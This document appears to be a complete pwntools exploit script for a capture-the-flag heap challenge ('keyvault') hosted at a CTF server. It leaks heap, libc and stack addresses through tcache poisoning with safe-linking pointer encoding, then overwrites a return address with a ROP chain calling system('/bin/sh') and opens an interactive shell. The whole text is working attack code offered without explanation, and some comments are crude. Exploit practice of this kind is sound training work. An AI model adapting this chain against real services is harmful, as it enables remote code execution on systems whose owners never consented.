from pwn import *
context.binary = exe = ELF('./keyvault')
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')

gdbscript = """
set max-visualize-chunk-size 0x500
c
"""
#breakrva 0x2067

#io = process(exe.path)
#io = gdb.debug(exe.path, gdbscript=gdbscript)
io = remote('keyvault.ctf.wales', 1337)

def create_key(slot, name, len):
    io.sendline(b'1')
    io.sendline(str(slot).encode())
    io.sendline(name)
    io.sendline(str(len).encode())

def view_key(slot):
    io.sendline(b'2')
    io.sendline(str(slot).encode())
    io.readuntil(b'Key: \033[32m')
    return bytes.fromhex(io.readuntil(b'\033[0m', drop=True))

def delete_key(slot):
    io.sendline(b'3')
    io.sendline(str(slot).encode())

def regenerate_key(slot, len, mode=1):
    io.sendline(b'4')
    io.sendline(str(slot).encode())
    io.sendline(str(len).encode())
    io.sendline(str(mode).encode())

def write_offset(slot, offset, data):
    l = offset + len(data)
    while l > offset:
        regenerate_key(slot, l, 3)
        ret = view_key(slot)
        if data[l - offset - 1] == 0 and len(ret) == l-1:
            l -= 1
        if len(ret) < l:
            continue
        if ret[l - 1] == data[l - offset - 1]:
            l -= 1
        
def ptr_encode(target, addr):
    return target ^ (addr >> 12)

create_key(15, b'ass', 0x20)
delete_key(15)

create_key(0, b'a', 0x20)
create_key(1, b'b', 0x20)
create_key(2, b'c', 0x20)

delete_key(0)
delete_key(2)

heap = u64(view_key(0).ljust(8, b'\x00')) << 12
log.info(f'heap: {hex(heap)}') 

# heap+0x320 is within the freed io struct, we want to leak libc from here
write_offset(1, 48, p64(ptr_encode(heap+0x320, heap+0x510)))

create_key(3, b'd', 0x20) # bleh
create_key(4, b'e', 0x20) # will lie within the io struct
create_key(5, b'f', 0x20) # perform another allocation such that our previous allocation will *actually* be populated with io shit since we just overwrote it

regenerate_key(4, 0x8*3, 3) # pad pad pad pad
leak = view_key(4)
libc.address = u64(leak[3*8:4*8].ljust(8, b'\x00')) - 0x2044e0
log.info(f'libc: {hex(libc.address)}')

# leak environ pls

create_key(6, b'g', 0x20)
create_key(7, b'h', 0x20)
create_key(8, b'i', 0x20)

delete_key(6)
delete_key(8)

# environ @ offset 0x20ad58, we align down to 0x20ad50
write_offset(7, 48, p64(ptr_encode(libc.address + 0x20ad58-0x8-0x20, heap+0x5d0)))

create_key(9, b'j', 0x20)
create_key(10, b'k', 0x20) # use for leak pls

regenerate_key(10, 0x20+8, 3)

stack = u64(view_key(10)[0x20+8:0x20+16].ljust(8, b'\x00'))
log.info(f'stack: {hex(stack)}')

# hack pls
# stack - somehting we go nuts

target = stack - 0x138 #0x168

log.info(f'target: {hex(target)}')

create_key(11, b'fortnite', 0x8)
create_key(12, b'roblox', 0x8)
create_key(13, b'fuck', 0x8)

delete_key(11)
delete_key(13)

write_offset(12, 32, p64(ptr_encode(target, heap+0x610)))

create_key(14, b'junk', 0x8)
create_key(15, b'pwned', 0x8)

r = ROP([libc])
r.raw(r.ret)
r.system(next(libc.search(b'/bin/sh')))

r.dump()

write_offset(15, 8, r.chain())

io.sendline(b'6')

io.interactive()
